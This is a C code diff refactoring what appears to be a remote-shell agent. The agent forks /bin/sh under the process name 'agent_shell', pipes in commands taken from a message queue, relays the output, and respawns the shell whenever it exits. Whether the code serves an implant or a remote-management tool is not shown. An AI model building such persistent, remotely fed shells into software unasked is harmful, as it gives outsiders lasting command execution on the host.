@@ -30,29 +30,30 @@ typedef struct Shell_Pipes{
 	Pipes pipes[3];
 } Shell_Pipes;
 
-void *shell_thread(void *vargp){
+STATIC int execute_shell(){
 	pid_t pid;
 	Shell_Pipes shell_pipes = {0};
 	Queue_Message* message;
 	int nbytes = 0;
 	char buf[BUFFERSIZE];
 	char* buffer;
+	int ret_val = RET_OK;
 	
 	for (int i = 0; i < 3; i++){
 		if (pipe(shell_pipes.pipes[i].pipefd) == -1){
-			printf("ERROR pipe failed\n");
-			exit(-1);
+			printf("ERROR pipe failed: %d\n", errno);
+			return RET_ERROR;
 		}
 	}
 	
 	// we don't want to block on read for STDOUT PIPE_OUT and STDERR PIPE_OUT
 	if (fcntl(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
 		printf("ERROR nonblocking pipe option failed\n");
-		exit(-1);
+		return RET_ERROR;
 	}
 	if (fcntl(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
 		printf("ERROR nonblocking pipe option failed\n");
-		exit(-1);
+		return RET_ERROR;
 	}
 		
 	pid = fork();
@@ -71,11 +72,14 @@ void *shell_thread(void *vargp){
 		dup2(shell_pipes.pipes[STDERR].pipefd[PIPE_IN], STDERR_FILENO);		// dup input of STDERR to shell STDERR
 		
 		// Execute shell
-		char * const argv[] = {"/bin/sh", NULL};
+		char * const argv[] = {"agent_shell", NULL};
 		execve("/bin/sh", argv, NULL);
 		
 		// If shell closes, end this process so parent can respawn
-		exit(0);
+		close(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT]);					// close output of STDIN
+		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN]);					// close input of STDOUT
+		close(shell_pipes.pipes[STDERR].pipefd[PIPE_IN]);					// close input of STDERR
+		exit(RET_OK);
 		
 	}
 	else {					// parent
@@ -86,12 +90,13 @@ void *shell_thread(void *vargp){
 		// check if child is still running
 		// if still running, dequeue messages and send to shell
 		// if child was killed, we need to start another child process
-		while (!waitpid(-1, NULL, WNOHANG)){
+		while (!(waitpid(pid, NULL, WNOHANG))){
 			if (message = dequeue(shell_send_queue, &shell_send_queue_lock)){
 				debug_print("dequeued message for shell: %s, %d\n", message->buffer, message->size);
 				if ((nbytes = write(shell_pipes.pipes[STDIN].pipefd[PIPE_IN], message->buffer, message->size)) == -1){
 					printf("ERROR write to shell\n");
-					exit(-1);
+					ret_val =  RET_ERROR;
+					break;
 				}
 				
 				free(message->buffer);
@@ -103,13 +108,11 @@ void *shell_thread(void *vargp){
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDOUT read from shell: %d\n", errno);
-					exit(-1);
+					ret_val =  RET_ERROR;
+					break;
 				}
 			}
 			else if (nbytes == 0){					// shell is closed?
-				close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN
-				close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT
-				close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR
 				break;
 			}
 			else{
@@ -129,19 +132,36 @@ void *shell_thread(void *vargp){
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDERR read from shell: %d\n", errno);
-					exit(-1);
+					ret_val =  RET_ERROR;
+					break;
 				}
 			}
 			else if (nbytes == 0){					// shell is closed?
-				close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN
-				close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT
-				close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR
 				break;
 			}
 			else{
 				printf("DEBUG STDERR: %s\n", buf);
 			}
 			memset(buf, 0, BUFFERSIZE);
+		}
+		
+		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);							// close input of STDIN
+		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);							// close output of STDOUT
+		close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);							// close output of STDERR
+	}
+	
+	debug_print("%s\n", "shell closed, restarting\n");
+	
+	return ret_val;
+}
+
+void *shell_thread(void *vargp){
+	int ret_val;
+	
+	for (;;){
+		if ((ret_val = execute_shell()) != RET_OK){
+			printf("ERROR execute shell\n");
+			exit(RET_ERROR);
 		}
 	}
 	
